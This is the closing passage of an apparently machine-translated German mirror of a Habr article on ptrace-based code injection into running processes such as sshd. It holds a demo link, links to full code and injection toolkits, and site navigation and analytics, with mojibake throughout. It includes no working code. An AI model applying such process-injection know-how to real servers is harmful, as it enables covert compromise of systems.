abf√§llt, wird nur der Prozess eines Benutzers beendet und nicht der √ºbergeordnete sshd-Prozess.  Nicht der gr√∂√üte Trost, aber es erleichtert eindeutig das Debuggen. <br><br><h1>  Injektion in Aktion </h1><br>  Ok, sehen wir uns die Demo an: <br><br> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><img src="https://asciinema.org/a/5i0dcmskkdwomlv6su2sxx07v.svg"></a> <br><br>  Den vollst√§ndigen Code finden Sie <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">hier</a> . <br><br>  Ich hoffe, diese Reise hat Ihnen genug Informationen gegeben, um sich selbst zu verfolgen. <br><br>  Ich m√∂chte den folgenden Personen und Websites danken, die beim Umgang mit ptrace geholfen haben: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Gaffe23 Dynamic Library Injection Toolkit</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Gro√üartige EvilSocket-Injektionsarbeit</a> </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de430302/">https://habr.com/ru/post/de430302/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de430290/index.html">Ein Versuch, die vierte Iteration des SpaceX BFR-Projekts vorherzusagen</a></li>
<li><a href="../de430292/index.html">Electronic Frontier Foundation: Die Netzwerkleistung des US-Polizeikennzeichens betr√§gt 0,5%</a></li>
<li><a href="../de430294/index.html">10 nicht offensichtliche Vorteile der Verwendung von Rust</a></li>
<li><a href="../de430296/index.html">Machen Sie Ihre Ideen App. Serverlose Anwendung - Schritt-f√ºr-Schritt-Anleitung</a></li>
<li><a href="../de430300/index.html">Microservices on Go mit dem Go-Kit: Einf√ºhrung</a></li>
<li><a href="../de430304/index.html">Ein wunderbarer Au√üenposten im Orbit</a></li>
<li><a href="../de430306/index.html">Der erste Tunnel der Boring Company wurde von Ilona Mask gebohrt</a></li>
<li><a href="../de430308/index.html">Python-Interna. Ostereier</a></li>
<li><a href="../de430312/index.html">Validierung komplexer Reaktionsformen. Teil 1</a></li>
<li><a href="../de430314/index.html">Ein weiterer Telegramm-Bot oder eine Dating-Bot-Implementierung</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>